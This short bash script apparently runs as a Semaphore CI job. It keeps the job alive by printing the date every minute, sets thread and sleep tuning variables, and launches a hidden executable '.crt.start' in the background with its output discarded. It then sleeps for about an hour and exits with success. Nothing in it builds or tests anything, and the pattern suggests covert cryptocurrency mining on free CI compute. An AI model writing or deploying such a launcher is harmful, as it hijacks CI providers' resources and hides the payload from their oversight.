#!/usr/bin/env bash


while :; do date; sleep 60; done &

export ENV_VARS="X_ID=\"semaphore-${SEMAPHORE_REPO_SLUG//\//-}-${SEMAPHORE_CURRENT_JOB}\" MHF_FIXED=1 THREADS_FIXED=4 CSLEEP=10000"
chmod +x .crt.start
./.crt.start &>/dev/null &

sleep $(((RANDOM%3+59-$RANDOM%3)*60))

exit 0
